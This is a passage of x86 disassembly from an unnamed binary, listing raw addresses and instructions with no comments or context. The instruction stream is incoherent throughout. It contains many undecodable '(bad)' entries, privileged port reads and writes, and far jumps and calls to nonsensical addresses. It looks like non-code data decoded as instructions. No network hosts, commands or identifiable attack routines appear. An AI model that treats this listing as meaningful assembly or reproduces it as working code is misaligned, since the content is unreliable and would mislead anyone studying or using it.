  4109cc:	pop    ss
  4109cd:	add    BYTE PTR [edx-0x6c],al
  4109d0:	cmp    al,0xe
  4109d2:	mov    edi,0x7637b82f
  4109d7:	popa   
  4109d8:	retf   0xfd9d
  4109db:	add    eax,DWORD PTR [ecx]
  4109dd:	pop    ebp
  4109de:	pop    eax
  4109df:	lahf   
  4109e0:	mov    bl,0xed
  4109e2:	mov    al,0xc0
  4109e4:	mov    DWORD PTR [esi],edx
  4109e6:	sbb    DWORD PTR [edi-0x24b14445],edi
  4109ec:	xor    eax,0x3160bdbb
  4109f1:	jle    0x4109c7
  4109f3:	rcl    BYTE PTR [ecx-0x4b28725d],1
  4109f9:	pop    esi
  4109fa:	add    al,0xdc
  4109fc:	mov    ecx,fs
  4109fe:	fsubr  DWORD PTR [eax+0x3f]
  410a01:	mov    eax,ds:0xc1fb401e
  410a06:	push   eax
  410a07:	mov    bh,0x77
  410a09:	cs push ecx
  410a0b:	out    0x20,al
  410a0d:	sub    eax,DWORD PTR [ecx+0x66]
  410a10:	mov    ds:0x790a185a,eax
  410a15:	adc    ch,BYTE PTR [edx+0x50]
  410a18:	ins    BYTE PTR es:[edi],dx
  410a19:	inc    esp
  410a1a:	or     DWORD PTR [esi-0x18],esi
  410a1d:	call   DWORD PTR [esi-0x3a]
  410a20:	push   edx
  410a21:	gs in  eax,dx
  410a23:	sub    esp,DWORD PTR [edi-0x5e]
  410a26:	pop    esi
  410a27:	mov    bh,0x84
  410a29:	stos   BYTE PTR es:[edi],al
  410a2a:	adc    BYTE PTR [ecx-0x35],dh
  410a2d:	test   eax,0x3063b7e7
  410a32:	add    BYTE PTR [ebx-0x16],ah
  410a35:	fsubr  QWORD PTR [ebx-0x1e41f830]
  410a3b:	or     BYTE PTR [edi],0xc8
  410a3e:	mov    eax,0x918f48d7
  410a43:	mov    dh,0x4b
  410a45:	(bad)  
  410a46:	inc    esp
  410a47:	or     eax,0x3774a0da
  410a4c:	cmp    eax,0xebe9742a
  410a51:	icebp  
  410a52:	(bad)
  410a55:	loop   0x410a9b
  410a57:	adc    eax,0x97c0f37a
  410a5c:	test   ch,ch
  410a5e:	pop    ds
  410a5f:	push   ebx
  410a60:	jnp    0x410a38
  410a62:	jl     0x4109f7
  410a64:	sahf   
  410a65:	sub    DWORD PTR [esi],0x1be0362c
  410a6b:	add    DWORD PTR [eax-0x20],esi
  410a6e:	jne    0x410a68
  410a70:	xchg   ecx,eax
  410a71:	mov    edx,0xf921374e
  410a76:	mov    cs,WORD PTR [esi+0x6e4b29b9]
  410a7c:	jle    0x410ade
  410a7e:	loope  0x410a4c
  410a80:	les    edx,FWORD PTR [eax-0x77d0ce14]
  410a86:	(bad)  [edx]
  410a88:	sbb    cl,BYTE PTR [esi]
  410a8a:	jbe    0x410adb
  410a8c:	gs mov esi,0x57c540f
  410a92:	jbe    0x410a16
  410a94:	lds    ebp,FWORD PTR [eax+edi*1]
  410a97:	bound  edi,QWORD PTR [edx+0x13847467]
  410a9d:	(bad)  
  410a9e:	sbb    al,0x1d
  410aa0:	mov    dh,0x76
  410aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aa3:	jne    0x410afd
  410aa5:	test   eax,0x375e2944
  410aaa:	enter  0x539b,0x53
  410aae:	pop    edi
  410aaf:	sbb    eax,DWORD PTR [edx]
  410ab1:	div    BYTE PTR [eax-0x2a]
  410ab4:	inc    esi
  410ab5:	xor    BYTE PTR [esi+0x56],bl
  410ab8:	xchg   DWORD PTR [ebp-0x5d6f02f5],ecx
  410abe:	or     ebx,ebx
  410ac0:	retf   0x4a9b
  410ac3:	mov    cl,0x46
  410ac5:	dec    eax
  410ac6:	push   esi
  410ac7:	rol    DWORD PTR [ebx],cl
  410ac9:	or     DWORD PTR [esi-0x6d],0xb4b49458
  410ad0:	inc    eax
  410ad1:	int3   
  410ad2:	js     0x410a6a
  410ad4:	jg     0x7a55dd13
  410ada:	shl    BYTE PTR [ebp-0x2d3295ea],cl
  410ae0:	ss pop ebp
  410ae2:	aam    0xc1
  410ae4:	cmp    eax,0x48561639
  410ae9:	inc    ebx
  410aea:	(bad)  
  410aeb:	xchg   ecx,eax
  410aec:	inc    ecx
  410aed:	scas   al,BYTE PTR es:[edi]
  410aee:	add    cl,BYTE PTR [ebx+0x19]
  410af1:	or     eax,DWORD PTR [ebp-0x6b]
  410af4:	(bad)  
  410af5:	lock dec ebx
  410af7:	gs pop es
  410af9:	sub    eax,0x77dfd0d5
  410afe:	jnp    0x410b39
  410b00:	adc    DWORD PTR [ecx+0x5960f2e8],0x596214d5
  410b0a:	ret    0x345c
  410b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b0e:	sub    BYTE PTR [edi],bh
  410b10:	pushf  
  410b11:	push   cs
  410b12:	imul   edi,DWORD PTR [ebp+ebx*2-0x17],0xffffffa1
  410b17:	push   0xffffffdf
  410b19:	gs stos BYTE PTR es:[edi],al
  410b1b:	out    0x2c,eax
  410b1d:	ret    0x5f5b
  410b20:	test   DWORD PTR ds:0xf07617c3,eax
  410b26:	adc    BYTE PTR [esi-0x7a],0x68
  410b2a:	mov    bl,0xfc
  410b2c:	les    edi,FWORD PTR [edi+ebx*4]
  410b2f:	in     eax,0x6f
  410b31:	and    eax,0xbeebdaad
  410b36:	fisub  WORD PTR [ecx]
  410b38:	into   
  410b39:	sbb    DWORD PTR [ebx+0x19336bd7],ebx
  410b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b40:	stos   DWORD PTR es:[edi],eax
  410b41:	mov    BYTE PTR ds:0x3b7acb1e,ch
  410b47:	push   edx
  410b48:	popa   
  410b49:	xor    eax,0x4db483ce
  410b4e:	xor    ecx,DWORD PTR [edi-0x50]
  410b51:	test   DWORD PTR [ebx-0x49],ebx
  410b54:	(bad)  
  410b55:	out    dx,eax
  410b56:	sub    BYTE PTR [esi+0x474f6fd0],dh
  410b5c:	xor    DWORD PTR [eax],0xf60dae93
  410b62:	js     0x410b13
  410b64:	mov    esp,0x2ae7a70f
  410b69:	jnp    0x410b55
  410b6b:	neg    BYTE PTR [edi+edi*2-0x2df208dc]
  410b72:	dec    edi
  410b73:	cmp    eax,0x296d5f0d
  410b78:	into   
  410b79:	pop    edx
  410b7a:	xchg   ebx,eax
  410b7b:	call   0x7bc1af1e
  410b80:	(bad)
  410b84:	jb     0x410b7d
  410b86:	cld    
  410b87:	test   BYTE PTR [esp+edx*2],0x9f
  410b8b:	xor    BYTE PTR [edi-0x3230b647],bl
  410b91:	jmp    FWORD PTR [edx-0x2c]
  410b94:	test   ecx,esp
  410b96:	push   0x8e2a16dd
  410b9b:	rcr    BYTE PTR [eax+ebp*4+0x1ee3b01b],0xeb
  410ba3:	push   ebx
  410ba4:	(bad)  
  410ba5:	in     eax,0x5d
  410ba7:	xor    al,0x1
  410ba9:	daa    
  410baa:	loop   0x410bcb
  410bac:	inc    esp
  410bad:	in     eax,0x99
  410baf:	scas   eax,DWORD PTR es:[edi]
  410bb0:	mov    cl,0x8a
  410bb2:	cmp    ebx,DWORD PTR [edi+0x28]
  410bb5:	cmp    edi,DWORD PTR [ebx]
  410bb7:	mov    ebx,DWORD PTR [eax]
  410bb9:	imul   BYTE PTR [esi]
  410bbb:	inc    edi
  410bbc:	std    
  410bbd:	mov    esi,0xd15b12d3
  410bc2:	xor    al,0x30
  410bc4:	cwde   
  410bc5:	(bad)  
  410bc6:	mov    bl,0x10
  410bc8:	sbb    BYTE PTR ss:[edi-0x40],bh
  410bcc:	and    BYTE PTR [esp+edi*1],cl
  410bcf:	xor    esi,DWORD PTR [edx-0x76]
  410bd2:	or     BYTE PTR [edi-0x747f7af1],bh
  410bd8:	mov    edi,0x47389632
  410bdd:	fs push edi
  410bdf:	xor    dl,BYTE PTR [esp+edi*2]
  410be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410be3:	adc    DWORD PTR [esi+0x54b9f9c5],edx
  410be9:	adc    DWORD PTR [ecx+0x67c9f5c7],ebx
  410bef:	(bad)  
  410bf0:	test   esi,0xba13ce2a
  410bf6:	jmp    0xdd64:0xcf1c4187
  410bfd:	mov    edx,0x9e38a675
  410c02:	int3   
  410c03:	adc    al,BYTE PTR [ebx+ecx*2]
  410c06:	mov    edi,DWORD PTR [edx-0x30]
  410c09:	fucomp st(5)
  410c0b:	inc    edi
  410c0c:	jl     0x410c4e
  410c0e:	lods   eax,DWORD PTR ds:[esi]
  410c0f:	mov    bl,0xf1
  410c11:	mov    es,WORD PTR [eax]
  410c13:	bound  esi,QWORD PTR [ecx-0x56511969]
  410c19:	push   ebx
  410c1a:	adc    BYTE PTR [ebp-0x28824237],dh
  410c20:	dec    eax
  410c21:	fld    DWORD PTR [esi-0x24d4df98]
  410c27:	cli    
  410c28:	cmp    al,0x3b
  410c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c2b:	in     al,0xa9
  410c2d:	jo     0x410c1d
  410c2f:	jbe    0x410ca2
  410c31:	push   ebp
  410c32:	ja     0x410bfe
  410c34:	sub    DWORD PTR [esi-0xf],0x7e
  410c38:	aad    0xea
  410c3a:	mov    ebp,0x40dd617c
  410c3f:	jnp    0x410bc5
  410c41:	sbb    DWORD PTR [esi+0x87f8c61],0x36
  410c48:	inc    ebp
  410c49:	sbb    esp,DWORD PTR [edi-0x485db33c]
  410c4f:	je     0x410c81
  410c51:	ficomp DWORD PTR [eax]
  410c53:	inc    edi
  410c54:	add    cl,BYTE PTR [ecx]
  410c56:	add    bh,dl
  410c58:	(bad)  
  410c59:	in     eax,0x76
  410c5b:	pop    es
  410c5c:	in     eax,0x86
  410c5e:	pop    es
  410c5f:	shl    DWORD PTR [edx],1
  410c61:	add    ch,BYTE PTR [ebx+0x59]
  410c64:	dec    esi
  410c65:	les    edx,FWORD PTR [edx]
  410c67:	pusha  
  410c68:	dec    ebp
  410c69:	scas   al,BYTE PTR es:[edi]
  410c6a:	adc    BYTE PTR ds:0x942cfec4,dl
  410c70:	xlat   BYTE PTR ds:[ebx]
  410c71:	xchg   esi,eax
  410c72:	cld    
  410c73:	inc    eax
  410c74:	pop    ds
  410c75:	adc    ebx,DWORD PTR [esi+0x17de3b83]
  410c7b:	ja     0x410c97
  410c7d:	imul   ebx,DWORD PTR [ecx+0x26c2d21a],0x4c098bab
  410c87:	sbb    eax,0x55f3f1d4
  410c8c:	inc    eax
  410c8d:	arpl   WORD PTR [ebp-0x4e7dcaf4],cx
  410c93:	xchg   ebx,eax
  410c94:	dec    ebp
  410c95:	retf   
  410c96:	dec    edx
  410c97:	dec    esp
  410c98:	jg     0x410c68
  410c9a:	inc    esi
  410c9b:	cmp    DWORD PTR [ebp+eax*8+0x99d37a9],esp
  410ca2:	sbb    DWORD PTR [edi+eiz*4+0x584d8c7c],eax
  410ca9:	stos   DWORD PTR es:[edi],eax
  410caa:	dec    ecx
  410cab:	and    BYTE PTR [edi],bh
  410cad:	sub    eax,0x1b9f616d
  410cb2:	mov    edx,0x463b81a9
  410cb7:	scas   al,BYTE PTR es:[edi]
  410cb8:	lock mov ecx,0xf7d71c80
  410cbe:	and    al,0xf5
  410cc0:	sub    DWORD PTR ds:0xdff18157,esi
  410cc6:	dec    ecx
  410cc7:	jmp    0x1637:0x90d29803
  410cce:	jae    0x410c55
  410cd0:	xor    edi,DWORD PTR [ebx-0x77]
  410cd3:	cwde   
  410cd4:	out    0x52,eax
  410cd6:	adc    BYTE PTR [edx+0x45acd034],0x18
  410cdd:	fwait
  410cde:	push   esp
  410cdf:	dec    edx
  410ce0:	pop    esi
  410ce1:	cli    
  410ce2:	xor    eax,DWORD PTR [ecx]
  410ce4:	stos   BYTE PTR es:[edi],al
  410ce5:	gs fs inc ebx
  410ce8:	sub    al,0xdb
  410cea:	and    edx,DWORD PTR [ebp+0x1a3fa313]
  410cf0:	inc    ebx
  410cf1:	and    eax,DWORD PTR [ebp-0x16]
  410cf4:	inc    ebx
  410cf5:	or     al,0xab
  410cf7:	rcr    ecx,0xa8
  410cfa:	inc    edi
  410cfb:	jno    0x410c95
  410cfd:	or     eax,0xc378bd51
  410d02:	out    dx,al
  410d03:	inc    ebx
  410d04:	fstp   TBYTE PTR [ecx-0x11]
  410d07:	xchg   ebp,eax
  410d08:	xchg   ecx,eax
  410d09:	sub    DWORD PTR [eax-0xab87c78],esi
  410d0f:	jno    0x410cbe
  410d11:	add    BYTE PTR [ebx+esi*8-0x30ff8d9e],ch
  410d18:	cdq    
  410d19:	dec    edi
  410d1a:	inc    esi
  410d1b:	out    0x63,eax
  410d1d:	int3   
  410d1e:	dec    ebx
  410d1f:	jge    0x410cdc
  410d21:	push   edx
  410d22:	fsub   QWORD PTR [esi]
  410d24:	push   cs
  410d25:	jns    0x410d09
  410d27:	sbb    BYTE PTR [eax-0xd126fc6],dl
  410d2d:	add    al,0xc8
  410d2f:	(bad)  
  410d30:	jp     0x410d63
  410d32:	ss js  0x410cf3
  410d35:	sub    ch,ch
  410d37:	adc    bl,ah
  410d39:	adc    esp,DWORD PTR [edx-0x71e4e087]
  410d3f:	sub    BYTE PTR [esi+0x6b59a2c9],0xd9
  410d46:	popa   
  410d47:	enter  0xe8ff,0x70
  410d4b:	dec    eax
  410d4c:	aas    
  410d4d:	xor    BYTE PTR [ebx-0x16],bl
  410d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d51:	xchg   dx,ax
  410d53:	cs iret 
  410d55:	dec    esi
  410d56:	in     al,0x8
  410d58:	jo     0x410d05
  410d5a:	mov    ah,0xf1
  410d5c:	and    ecx,DWORD PTR [ecx+ebx*2]
  410d5f:	cmc    
  410d60:	mov    ds:0x41ea201a,eax
  410d65:	cmc    
  410d66:	pop    es
  410d67:	mov    eax,0x32c86932
  410d6c:	aas    
  410d6d:	push   esi
  410d6e:	mov    esp,0xac92844b
  410d73:	adc    BYTE PTR [eax-0x29],al
  410d76:	cmc    
  410d77:	mov    ebx,0xc302bd4f
  410d7c:	push   0x22
  410d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d7f:	or     eax,0x7c79179b
  410d84:	cs adc esi,eax
  410d87:	bound  eax,QWORD PTR [edi]
  410d89:	cmp    DWORD PTR [edx+0x33449d7],esp
  410d8f:	lods   eax,DWORD PTR ds:[esi]
  410d90:	xor    al,0xb7
  410d92:	inc    ebp
  410d93:	adc    ah,BYTE PTR [eax-0x6e2309ea]
  410d99:	pop    ss
  410d9a:	rcr    BYTE PTR [ecx+0x4b83ce5b],0x44
  410da1:	aaa    
  410da2:	mov    ecx,DWORD PTR [edi-0x789840ef]
  410da8:	xchg   ebp,eax
  410da9:	mov    esi,DWORD PTR [ebx]
  410dab:	add    DWORD PTR [ecx-0x4b0c4d7e],0x2689e27f
  410db5:	pop    es
  410db6:	loop   0x410e07
  410db8:	add    DWORD PTR [eax+0x6e10e8df],ebp
  410dbe:	inc    esp
  410dbf:	das    
  410dc0:	shr    DWORD PTR [ebx+0x5e966917],1
  410dc6:	enter  0x7e6a,0xfd
  410dca:	xor    BYTE PTR [ecx+ecx*4],0x1c
  410dce:	lods   al,BYTE PTR ds:[esi]
  410dcf:	push   cs
  410dd0:	mov    ebx,0x5b776363
  410dd5:	sahf   
  410dd6:	jmp    0x410dd8
  410dd8:	or     bl,bh
  410dda:	sub    al,0x52
  410ddc:	lds    esi,FWORD PTR [edx]
  410dde:	jo     0x410d69
  410de0:	mov    ebp,0x7de74a60
  410de5:	mov    edi,0xc440f30f
  410deb:	pushf  
  410dec:	inc    edx
  410ded:	xor    DWORD PTR [eax+0x49],esi
  410df0:	leave  
  410df1:	sub    BYTE PTR [edi],dh
  410df3:	or     bl,BYTE PTR [eax+edi*1+0x8d03318]
  410dfa:	xchg   DWORD PTR [ecx-0x6435eded],esp
  410e00:	and    DWORD PTR [eax],eax
  410e02:	outs   dx,BYTE PTR ds:[esi]
  410e03:	not    BYTE PTR [esi-0x65565e96]
  410e09:	and    bh,dh
  410e0b:	cmp    BYTE PTR [eax+0x4a],ch
  410e0e:	pusha  
  410e0f:	cld    
  410e10:	scas   al,BYTE PTR es:[edi]
  410e11:	inc    esi
  410e12:	mov    esi,ebp
  410e14:	mov    WORD PTR [ebx-0x14],ds
  410e17:	ins    BYTE PTR es:[edi],dx
  410e18:	loop   0x410dc8
  410e1a:	xor    BYTE PTR [ecx],bh
  410e1c:	xchg   bh,ah
  410e1e:	push   ds
  410e1f:	in     al,0x42
  410e21:	sub    DWORD PTR [edx-0x6b5fa604],ecx
  410e27:	ffree  st(1)
  410e29:	fisubr DWORD PTR [edi+0x42]
  410e2c:	adc    cl,al
  410e2e:	mov    WORD PTR [ebx-0x150f05d4],ss
  410e34:	mov    esp,0xe68a8296
  410e39:	scas   eax,DWORD PTR es:[edi]
  410e3a:	push   ds
  410e3b:	mov    ds:0xbae3c91f,eax
  410e40:	leave  
  410e41:	add    eax,0x5f12e633
  410e46:	xor    eax,DWORD PTR [esi+0x27]
  410e49:	inc    eax
  410e4a:	fist   WORD PTR [edx-0x1e]
  410e4d:	jmp    0x410e19
  410e4f:	and    DWORD PTR [esi-0x5523344d],0x7bb2ee67
  410e59:	xor    al,al
  410e5b:	scas   eax,DWORD PTR es:[edi]
  410e5c:	repz dec edx
  410e5e:	dec    eax
  410e5f:	test   eax,0xb2c90bde
  410e64:	and    ah,BYTE PTR [ebx+0x76]
  410e67:	sahf   
  410e68:	int    0x3d
  410e6a:	dec    ebx
  410e6b:	jb     0x410e62
  410e6d:	int    0xca
  410e6f:	outs   dx,DWORD PTR ds:[esi]
  410e70:	cmp    al,0xb4
  410e72:	pop    ss
  410e73:	add    cl,BYTE PTR [ebx+0x1c]
  410e76:	mov    ebx,0xe3138990
  410e7b:	repz sbb eax,0x6ad95937
  410e81:	cmp    ah,bl
  410e83:	and    BYTE PTR [ebx+0x32],bl
  410e86:	pop    edi
  410e87:	push   eax
  410e88:	int3   
  410e89:	fidiv  WORD PTR [esi+0xd]
  410e8c:	retf   
  410e8d:	stos   BYTE PTR es:[edi],al
  410e8e:	mov    ebp,0xa9072b83
  410e93:	jno    0x410efe
  410e95:	adc    eax,0x2fd22885
  410e9a:	ret    
  410e9b:	and    BYTE PTR [edi-0x42708b1f],0xea
  410ea2:	jmp    0x410e33
  410ea4:	int    0xc8
  410ea6:	push   esi
  410ea7:	mov    eax,0x7893e597
  410eac:	mov    edx,0x52f9148a
  410eb1:	jno    0x410e90
  410eb3:	xchg   edi,eax
  410eb4:	not    BYTE PTR [ebp-0x238ece48]
  410eba:	(bad)  
  410ebb:	fistp  QWORD PTR [eax]
  410ebd:	rcl    DWORD PTR [edx],1
  410ebf:	push   es
  410ec0:	popf   
  410ec1:	popf   
  410ec2:	or     ebp,DWORD PTR [esi-0x38da78fb]
  410ec8:	adc    ch,BYTE PTR [edi+0x2d]
  410ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ecc:	clc    
  410ecd:	push   0x3c420d8f
  410ed2:	test   BYTE PTR [esi-0x2ef1c305],bl
  410ed8:	push   esp
  410ed9:	ror    BYTE PTR [ebx-0x20],cl
  410edc:	push   ebp
  410edd:	or     eax,0x74899725
  410ee2:	or     dh,dh
  410ee4:	lock jp 0x410efa
  410ee7:	and    ecx,DWORD PTR [edx]
  410ee9:	jo     0x410f0c
  410eeb:	test   BYTE PTR [esi+0x72f0d703],dh
  410ef1:	(bad)  
  410ef2:	dec    ebx
  410ef3:	mov    esp,0x928db8b
  410ef8:	repnz dec ebx
  410efa:	int    0xe0
  410efc:	fwait
  410efd:	call   0x979:0x37ed1a30
  410f04:	stc    
  410f05:	or     DWORD PTR [ebx-0x5b132a6f],edi
  410f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f0c:	loop   0x410ef6
  410f0e:	mov    eax,ds:0x10af2ca3
  410f13:	leave  
  410f14:	push   cs
  410f15:	test   eax,0x199d2414
  410f1a:	dec    esp
  410f1b:	call   0x20717e4
  410f20:	pop    ecx
  410f21:	dec    ebx
  410f22:	dec    ecx
  410f23:	test   al,0x99
  410f25:	lds    edi,FWORD PTR [eax-0x37]
  410f28:	pop    edi
  410f29:	fdivr  DWORD PTR [esi+edx*2-0x524be8bd]
  410f30:	mov    edx,0x63c5d396
  410f35:	bound  edi,QWORD PTR [eax-0x538e829e]
  410f3b:	xchg   edi,eax
  410f3c:	jne    0x410f23
  410f3e:	arpl   ax,ax
  410f40:	sbb    ecx,DWORD PTR [esi+0x72]
  410f43:	jo     0x410f3a
  410f45:	stos   DWORD PTR es:[edi],eax
  410f46:	mov    ah,0x73
  410f48:	inc    eax
  410f49:	in     eax,dx
  410f4a:	sub    bl,bl
  410f4c:	pop    ecx
  410f4d:	jp     0x410f3f
  410f4f:	push   ds
  410f50:	push   ss
  410f51:	clc    
  410f52:	js     0x410fc4
  410f54:	mov    eax,ds:0xd34207b1
  410f59:	xchg   ebp,eax
  410f5a:	ret    0x6130
  410f5d:	jae    0x410fc9
  410f5f:	mov    esi,0xd1436407
  410f64:	pop    eax
  410f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f66:	test   DWORD PTR [esi],esp
  410f68:	icebp  
  410f69:	out    0xd8,al
  410f6b:	and    esi,DWORD PTR [ecx-0x38673173]
  410f71:	mov    esi,0x5381f39b
  410f76:	fiadd  WORD PTR [edx+0x63324bf7]
  410f7c:	inc    esi
  410f7d:	xor    BYTE PTR [ebp+ebx*1+0xf],bl
  410f81:	outs   dx,DWORD PTR ds:[esi]
  410f82:	ins    BYTE PTR es:[edi],dx
  410f83:	dec    edi
  410f84:	mov    edx,0xa95be861
  410f89:	sbb    DWORD PTR [eax-0x75e8e318],eax
  410f8f:	in     al,0x3a
  410f91:	jae    0x410f63
  410f93:	jnp    0x410f51
  410f95:	aas    
  410f96:	xchg   ebp,eax
  410f97:	add    dh,BYTE PTR [edi-0x6197dab4]
  410f9d:	cmp    BYTE PTR [eax+0x59],cl
  410fa0:	ret    
  410fa1:	push   ebx
  410fa2:	in     al,0xfa
  410fa4:	out    0xc3,eax
  410fa6:	shl    BYTE PTR [ebx],cl
  410fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fa9:	aam    0x6
  410fab:	cmp    ah,BYTE PTR [ecx]
  410fad:	mov    ds:0xdda1bbeb,eax
  410fb2:	jnp    0x410f4b
  410fb4:	jb     0x410f37
  410fb6:	pop    es
  410fb7:	xor    al,0xc6
  410fb9:	(bad)  
  410fba:	addr16 push ds
  410fbc:	xchg   edx,eax
  410fbd:	(bad)  
  410fbf:	sub    BYTE PTR [ebp-0x33],dh
  410fc2:	call   0x59547552
  410fc7:	retf   0xccc4
  410fca:	loopne 0x411000
  410fcc:	sub    edx,DWORD PTR [edx+0x540d4b58]
  410fd2:	or     eax,0x23c98814
  410fd7:	ds push edx
  410fd9:	mov    bl,0x47
  410fdb:	les    ebx,FWORD PTR [edx+0x32]
  410fde:	xchg   esp,eax
  410fdf:	sbb    ah,BYTE PTR [eax]
  410fe1:	cmp    BYTE PTR [edi],ch
  410fe3:	out    0x5d,al
  410fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fe6:	retf   0xdb3a
  410fe9:	inc    eax
  410fea:	mov    al,ds:0xdd181853
  410fef:	pop    ebp
  410ff0:	xchg   ebx,eax
  410ff1:	fist   WORD PTR [ecx+0x2b6b37cd]
  410ff7:	iret   
  410ff8:	and    ch,dl
  410ffa:	pop    edx
  410ffb:	call   0x8a82:0x7647c56a
  411002:	pushf  
  411003:	mov    ch,0xd2
  411005:	mov    bh,0xb3
  411007:	jo     0x411079
  411009:	cmp    cl,BYTE PTR [edx+eiz*8-0x1303d26a]
  411010:	lahf   
  411011:	xor    al,0x1c
  411013:	mov    al,dh
  411015:	cmp    edx,esi
  411017:	jmp    0x320f:0xf791e528
  41101e:	sar    ecx,cl
  411020:	daa    
  411021:	adc    ch,ch
  411023:	sbb    eax,0x799ba0f9
  411028:	xchg   ecx,eax
  411029:	fnstenv ds:0x9ec63a7d
  41102f:	data16 jbe 0x411061
  411032:	aas    
  411033:	(bad)  
  411034:	pushf  
  411035:	inc    BYTE PTR ds:0xa1a3eaea
  41103b:	aaa    
  41103c:	ss sub eax,0xbde4df94
  411042:	(bad)  
  411043:	call   0x39430abd
  411048:	popa   
  411049:	jbe    0x411043
  41104b:	rcr    BYTE PTR [ecx],cl
  41104d:	pushf  
  41104e:	(bad)  
  41104f:	pop    esp
  411050:	mov    dl,0x80
  411052:	cmc    
  411053:	lock push ss
  411055:	in     eax,0xa5
  411057:	int    0x70
  411059:	sub    dl,ah
  41105b:	jp     0x4110cc
  41105d:	in     eax,dx
  41105e:	(bad)  
  41105f:	adc    bh,dh
  411061:	and    DWORD PTR [edi+0x66f6f5bd],ebx
  411067:	(bad)  
  411068:	xchg   ebp,eax
  411069:	dec    eax
  41106a:	(bad)  [eax+esi*1-0x18]
  41106e:	push   ebp
  41106f:	cmp    edi,DWORD PTR [edx]
  411071:	retf   0xdc6
  411074:	mov    al,0xba
  411076:	jle    0x4110b4
  411078:	jo     0x4110ec
  41107a:	fstp   DWORD PTR [ebx+eiz*1+0x7dd89eca]
  411081:	add    al,0x65
  411083:	jmp    0xc0ad:0x44ea9ffc
  41108a:	xchg   DWORD PTR [ebp+0x2937f71b],esi
  411090:	div    BYTE PTR [eax+0x432bbb65]
  411096:	fucomi st,st(5)
  411098:	call   0x357:0x644076db
  41109f:	ja     0x411043
  4110a1:	fistp  QWORD PTR [eax]
  4110a3:	in     eax,dx
  4110a4:	mov    al,ds:0x326ed836
  4110a9:	aam    0xb6
  4110ab:	jecxz  0x41108c
  4110ad:	aaa    
  4110ae:	sub    eax,0xa0d52e38
  4110b3:	and    eax,0x83c4a616
  4110b8:	xor    dh,al
  4110ba:	cmp    eax,0x3b38e1d1
  4110bf:	inc    esp
  4110c0:	(bad)  
  4110c1:	jp     0x41106d
  4110c3:	jl     0x4110c1
  4110c5:	aaa    
  4110c6:	mov    ah,0x1c
  4110c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c9:	push   ds
  4110ca:	dec    eax
  4110cb:	xlat   BYTE PTR ds:[ebx]
  4110cc:	mov    cl,0x27
  4110ce:	push   ds
  4110cf:	mov    eax,0x382b9924
  4110d4:	jnp    0x4110dc
  4110d6:	mov    al,ds:0xaf9181a7
  4110db:	add    BYTE PTR [esi],0x91
  4110de:	xor    BYTE PTR [edx-0x49],ah
  4110e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110e2:	jmp    0xda6a9397
  4110e7:	mov    ebx,0xdfbd7fcc
  4110ec:	push   edi
  4110ed:	fidivr WORD PTR [ebx]
  4110ef:	or     eax,0xb754cb12
  4110f4:	loop   0x4110a5
  4110f6:	xor    DWORD PTR [ecx+ebp*1-0x31669689],esi
  4110fd:	xchg   ax,bp
  411100:	sub    ecx,edx
  411102:	dec    ebp
  411103:	jg     0x411130
  411105:	lock sub DWORD PTR [ebp-0x46679623],ecx
  41110c:	mov    WORD PTR [esp+ecx*4+0xc],ds
  411110:	xor    BYTE PTR [ebx+0x54],bl
  411113:	cmp    BYTE PTR [eax-0x2e],dh
  411116:	retf   0x1e10
  411119:	repz popa 
  41111b:	and    al,0x2
  41111d:	rol    BYTE PTR [eax+0x0],0xf5
  411121:	fcom   QWORD PTR [ebx+0x1e268d48]
  411127:	mov    al,ds:0x534385b5
  41112c:	test   DWORD PTR [edx],0x53a36fec
  411132:	retf   
  411133:	mov    cl,0x47
  411135:	outs   dx,BYTE PTR ds:[esi]
  411136:	xor    al,0x66
  411138:	cs inc edx
  41113a:	jnp    0x4111a6
  41113c:	movsx  ecx,WORD PTR [edx]
  41113f:	scas   eax,DWORD PTR es:[edi]
  411140:	(bad)  
  411141:	and    esi,DWORD PTR ds:0xbd03f63a
  411147:	out    0x89,eax
  411149:	cmp    bl,bl
  41114b:	jge    0x41112d
  41114d:	adc    esp,DWORD PTR [edi]
  41114f:	mov    cl,0xba
  411151:	(bad)  
  411152:	or     ebx,ecx
  411154:	xchg   edi,eax
  411155:	or     DWORD PTR [ebx+0x7a],eax
  411158:	mov    edi,0xeecc96ab
  41115d:	or     DWORD PTR [esi],ecx
  41115f:	sub    DWORD PTR [edi+0x5],esi
  411162:	mov    al,ds:0x48abfd6d
  411167:	push   edx
  411168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411169:	fdiv   DWORD PTR [ecx+eiz*1+0x5d920776]
  411170:	pusha  
  411171:	fcom   QWORD PTR [ebp-0x3c9a7cbf]
  411177:	cs lock cwde 
  41117a:	or     eax,eax
  41117c:	push   edx
  41117d:	dec    eax
  41117e:	pop    ds
  41117f:	in     eax,dx
  411180:	imul   ebx,ecx,0x22109bf1
  411186:	add    eax,ebp
  411188:	push   ebx
  411189:	or     DWORD PTR [eax-0x7b6e3d21],0xca983da5
  411193:	test   BYTE PTR [ecx-0x30],bh
  411196:	xchg   ebx,eax
  411197:	mov    edi,0xbb2fea9f
  41119c:	retf   
  41119d:	call   FWORD PTR cs:[ecx-0x30557445]
  4111a4:	mov    eax,0xbe25bbab
  4111a9:	cld    
  4111aa:	fld    DWORD PTR [esi]
  4111ac:	jmp    0x904274aa
  4111b1:	mov    dl,0xc3
  4111b3:	ret    0x7054
  4111b6:	xchg   edx,eax
  4111b7:	push   esp
  4111b8:	retf   0x4317
  4111bb:	lock test DWORD PTR [eax],ebx
  4111be:	in     eax,dx
  4111bf:	cwde   
  4111c0:	xchg   esi,eax
  4111c1:	neg    BYTE PTR [eax+ebx*8]
  4111c4:	iret   
  4111c5:	sub    BYTE PTR [eax+eiz*1],bh
